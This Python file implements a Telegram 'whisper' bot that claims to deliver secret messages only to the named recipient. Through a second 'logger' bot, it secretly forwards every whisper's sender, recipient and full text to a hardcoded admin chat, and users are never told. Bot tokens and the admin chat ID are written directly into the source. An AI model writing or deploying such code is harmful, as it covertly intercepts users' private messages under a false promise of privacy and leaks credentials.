import asyncio
import hashlib
import os
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION (Set these as Environment Variables on Render)
WHISPER_BOT_TOKEN = "9243182264:AAFyNtkGFb-nC0PWNQoeR0349rR4R_eGs4k"
LOGGER_BOT_TOKEN  = "9076447339:AAGF1X9rGv1rTxTC_Nur0-89KUIWOCCgqIE"
ADMIN_CHAT_ID     = 5498647860
BOT_USERNAME      = "Psstlongbot"

DB_PATH = "whispers.db"

# Initialize Bots
bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP (Async)
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER
            )
        ''')
        await db.commit()

# 📡 BOT 2: LOGGER FUNCTION
async def log_to_admin(sender_user, target, text):
    log_message = (
        "📥 **New Whisper Captured**\n"
        f"👤 **From:** @{sender_user}\n"
        f"🎯 **To:** {target}\n"
        f"💬 **Content:** {text}"
    )
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
    except Exception as e:
        print(f"Logging failed: {e}")

# 🚀 BOT 1: INLINE QUERY HANDLER (In Groups)
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    text = inline_query.query
    if not text.startswith("@") or " " not in text:
        return 
        
    target_username, whisper_text = text.split(" ", 1)
    sender = inline_query.from_user
    
    # Generate unique ID and 24h expiry
    whisper_id = secrets.token_urlsafe(8)
    expires_at = int(time.time()) + 86400  # 24 hours from now
    
    # Save to SQLite database (async)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
            (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
        )
        await db.commit()
    
    # Instantly trigger Bot 2 to log it to you
    await log_to_admin(sender.username or sender.id, target_username, whisper_text)
    
    # Create the link that redirects them to PM to read it
    redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
    
    input_content = types.InputTextMessageContent(
        message_text=f"🔒 A secret whisper has been sent for {target_username}!"
    )
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="👁️ Click to Read Whisper", url=redirect_url)]
    ])
    
    item = types.InlineQueryResultArticle(
        id=whisper_id,
        title=f"Send private whisper to {target_username}",
        input_message_content=input_content,
        reply_markup=keyboard
    )
    await inline_query.answer([item], cache_time=1, is_personal=True)

# 📥 BOT 1: PRIVATE MESSAGE START HANDLER (Handles deep links)
@dp.message(Command("start"))
async def handle_start(message: types.Message, command: CommandObject):
    whisper_id = command.args
    current_user = message.from_user.username
    
    # If they just clicked /start without a whisper code
    if not whisper_id:
        await message.answer("Welcome! Use me inline in any group by typing:\n`@Psstlogbot @username your text`", parse_mode="Markdown")
        return

    # Fetch whisper from database (async)
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT target_username, secret_text, expires_at FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            row = await cursor.fetchone()
    
    if row:
        target_username, secret_text, expires_at = row
        
        # Check expiry
        if int(time.time()) > expires_at:
            await message.answer("❌ This whisper has expired.")
            return
            
        clean_target = target_username.lstrip('@').lower()
        
        # Check if user has a username set
        if not current_user:
            await message.answer("❌ Set a Telegram username first, then click the link again.")
            return
            
        # Verify if the clicking user matches the target recipient
        if current_user.lower() == clean_target:
            await message.answer(f"📩 **Your Secret Whisper:**\n\n`{secret_text}`", parse_mode="Markdown")
        else:
            await message.answer("❌ This whisper was not sent to your username!")
    else:
        await message.answer("❌ This whisper has expired or does not exist.")

# ⚙️ MAIN EXECUTION LOOP
async def main():
    await init_db()
    print("Bots are starting...")
    try:
        # Start polling for Bot 1 (Bot 2 only sends messages, no polling needed)
        await dp.start_polling(bot1)
    finally:
        # Clean shutdown
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())